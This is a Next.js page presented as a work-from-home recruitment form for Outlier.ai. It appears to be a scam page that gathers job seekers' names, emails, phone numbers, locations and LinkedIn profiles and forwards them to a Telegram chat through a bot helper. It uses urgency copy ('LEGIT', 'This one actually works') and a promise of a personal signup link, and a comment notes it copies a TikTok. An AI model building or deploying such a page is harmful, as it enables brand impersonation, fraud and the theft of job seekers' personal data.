"use client";

import { useState, FormEvent, ChangeEvent } from "react";
import { useRouter } from "next/navigation";
import { sendTelegramMessage } from "../../utils/telegram";

export default function OutlierRecruitmentPage() {
  const [formData, setFormData] = useState({
    fullName: "",
    email: "",
    phone: "",
    location: "",
    linkedin: "",
    currentTitle: "",
    yearsExperience: "",
    availability: "",
  });

  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const router = useRouter();

  const handleChange = (e: ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setError("");
    setLoading(true);

    if (!formData.fullName.trim() || !formData.email.trim() || !formData.phone.trim()) {
      setError("Please fill in all required fields ⭐");
      setLoading(false);
      return;
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(formData.email)) {
      setError("Please enter a valid email address");
      setLoading(false);
      return;
    }

    const message = `
🚀 NEW OUTLIER APPLICATION 🚀

👤 Name: ${formData.fullName}
✉️ Email: ${formData.email}
📍 Location: ${formData.location || "Not provided"}
📞 Phone: ${formData.phone}
🔗 LinkedIn: ${formData.linkedin || "None"}
💼 Title: ${formData.currentTitle || "Not provided"}
⏳ Experience: ${formData.yearsExperience || "Not provided"}
📅 Start: ${formData.availability || "Not provided"}
    `.trim();

    try {
  await sendTelegramMessage(message);
  router.push("/thank-you");
} catch (err) {
  console.error(err);
  setError("Something went wrong – try again");
} finally {
  setLoading(false);
}
  };

  return (
    <div className="min-h-screen bg-[#f8f1e3] text-gray-900 flex flex-col">
      {/* Header like the TikTok */}
      <header className="bg-white border-b py-6 shadow-sm">
        <div className="max-w-4xl mx-auto px-6 text-center">
          <div className="inline-flex items-center gap-2 bg-emerald-100 text-emerald-700 text-sm font-medium px-4 py-2 rounded-3xl mb-4">
            ⭐ LEGIT WFH OPPORTUNITY
          </div>
          <h1 className="text-5xl md:text-6xl font-bold tracking-tighter leading-none">
            WFH OPPORTUNITY
          </h1>
          <p className="text-2xl text-gray-600 mt-4">
            Earn $15–$50+/hr with Outlier.ai • No experience needed • Work from anywhere
          </p>
        </div>
      </header>

      <main className="flex-1 max-w-2xl mx-auto w-full px-6 py-12">
        <div className="bg-white rounded-3xl shadow-xl p-8 md:p-10">
          <p className="text-center text-lg text-gray-600 mb-8">
            Tired of searching for a real remote job? <br />
            <span className="font-semibold text-emerald-600">This one actually works.</span>
          </p>

          {error && (
            <div className="mb-6 bg-red-50 border border-red-200 text-red-600 px-5 py-4 rounded-2xl text-center">
              {error}
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-8">
            <div>
              <label className="block text-sm font-medium mb-2">Full Name <span className="text-red-500">*</span></label>
              <input
                type="text"
                name="fullName"
                value={formData.fullName}
                onChange={handleChange}
                className="w-full h-14 px-6 rounded-2xl border border-gray-300 focus:border-emerald-500 text-lg"
                required
              />
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div>
                <label className="block text-sm font-medium mb-2">Email <span className="text-red-500">*</span></label>
                <input
                  type="email"
                  name="email"
                  value={formData.email}
                  onChange={handleChange}
                  className="w-full h-14 px-6 rounded-2xl border border-gray-300 focus:border-emerald-500 text-lg"
                  required
                />
              </div>
              <div>
                <label className="block text-sm font-medium mb-2">Phone Number <span className="text-red-500">*</span></label>
                <input
                  type="tel"
                  name="phone"
                  value={formData.phone}
                  onChange={handleChange}
                  className="w-full h-14 px-6 rounded-2xl border border-gray-300 focus:border-emerald-500 text-lg"
                  required
                />
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium mb-2">City / Country</label>
              <input
                type="text"
                name="location"
                value={formData.location}
                onChange={handleChange}
                className="w-full h-14 px-6 rounded-2xl border border-gray-300 focus:border-emerald-500 text-lg"
              />
            </div>

            {/* Other fields (optional but helpful) */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div>
                <label className="block text-sm font-medium mb-2">LinkedIn (optional)</label>
                <input type="url" name="linkedin" value={formData.linkedin} onChange={handleChange} className="w-full h-14 px-6 rounded-2xl border border-gray-300 focus:border-emerald-500 text-lg" />
              </div>
              <div>
                <label className="block text-sm font-medium mb-2">Years of Experience</label>
                <select name="yearsExperience" value={formData.yearsExperience} onChange={handleChange} className="w-full h-14 px-6 rounded-2xl border border-gray-300 focus:border-emerald-500 text-lg">
                  <option value="">Select...</option>
                  <option value="0-2">0 - 2 years</option>
                  <option value="3-5">3 - 5 years</option>
                  <option value="6-9">6 - 9 years</option>
                  <option value="10+">10+ years</option>
                </select>
              </div>
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full h-16 bg-emerald-600 hover:bg-emerald-700 text-white font-semibold text-2xl rounded-3xl transition-all active:scale-95 disabled:opacity-70"
            >
              {loading ? "Submitting..." : "YES, SEND ME THE LINK"}
            </button>
          </form>
        </div>

        <p className="text-center text-gray-500 text-sm mt-10">
          I’ll reply within minutes with your personal Outlier signup link + step-by-step instructions.<br />
          Most people start earning this week.
        </p>
      </main>
    </div>
  );
}